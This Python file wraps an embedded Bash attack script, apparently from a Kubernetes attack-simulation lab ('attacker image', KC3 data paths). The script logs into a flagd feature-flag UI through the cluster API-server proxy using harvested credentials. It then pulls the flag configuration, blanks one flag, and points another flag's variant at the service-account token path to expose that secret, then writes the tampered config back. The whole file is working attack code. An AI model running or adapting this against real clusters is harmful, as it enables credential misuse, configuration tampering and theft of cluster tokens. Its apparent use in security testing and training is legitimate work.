#!/usr/bin/env python3
"""Python entrypoint for modify-flags.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

# ===== Config =====
API_SERVER="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
NSCREDS="${NSCREDS:-mem}"

FLAGHOST="flagd:4000"
TARGET_FLAG1="cryptoWord"
TARGET_FLAG2="exposedPath"
FNCREDS="$DATA_PATH/KC3/credentials"
PROXY_UI="$API_SERVER/api/v1/namespaces/$NSCREDS/services/$FLAGHOST/proxy"
COOKIEJAR="$DATA_PATH/KC3/flagd_ui_cookies.txt"
FILE_CONFIG="$DATA_PATH/KC3/flagd-config"

# Installing dependencies and setup
require_tools curl jq awk
mkdir -p "$DATA_PATH/KC3"

echo "Login in flagd"
mapfile -t CREDS < $FNCREDS
UI_USER="${CREDS[1]}"
UI_PASS="${CREDS[0]}"
curl -k -c "$COOKIEJAR" -sS -X POST "$PROXY_UI/feature/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$UI_USER\",\"password\":\"$UI_PASS\"}"

echo "Taking the config file"
COOKIE=$(awk '!/^#/ && $6!="" {print $6"="$7}' "$COOKIEJAR")
curl -k -sS \
  -H "Cookie: $COOKIE" \
  "$PROXY_UI/feature/api/read-file" | jq . > $FILE_CONFIG

echo "Modifying $TARGET_FLAG1 and $TARGET_FLAG2"
jq \
  --arg f "$TARGET_FLAG1" \
  --arg f2 "$TARGET_FLAG2" \
  '(.flags[$f].defaultVariant = "empty") 
   | (.flags[$f2].variants.log = "/var/run/secrets/kubernetes.io/serviceaccount/token")' \
  "$FILE_CONFIG" > "${FILE_CONFIG}.new"
mv "${FILE_CONFIG}.new" "$FILE_CONFIG"
  
curl -sSk -X POST "$PROXY_UI/feature/api/write-to-file" \
  -H "Cookie: $COOKIE" \
  -H "Content-Type: application/json" \
  --data "{\"data\": $(cat "$FILE_CONFIG")}"
"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
